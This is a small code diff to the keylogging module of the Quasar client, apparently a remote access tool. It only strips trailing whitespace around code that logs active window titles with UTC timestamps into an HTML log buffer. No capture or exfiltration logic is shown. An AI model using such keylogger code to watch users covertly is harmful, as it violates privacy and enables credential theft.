@@ -51,7 +51,7 @@ namespace Quasar.Client.Logging
         /// Saves the last window title of an application.
         /// </summary>
         private string _lastWindowTitle = string.Empty;
-        
+
         /// <summary>
         /// Determines if special keys should be ignored for processing, e.g. when a modifier key is pressed.
         /// </summary>
@@ -152,9 +152,9 @@ namespace Quasar.Client.Logging
             if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
             {
                 _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
-                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - " 
-                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo) 
+                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>"
+                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - "
+                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)
                     + " UTC</b>]</p><br>");
             }
 
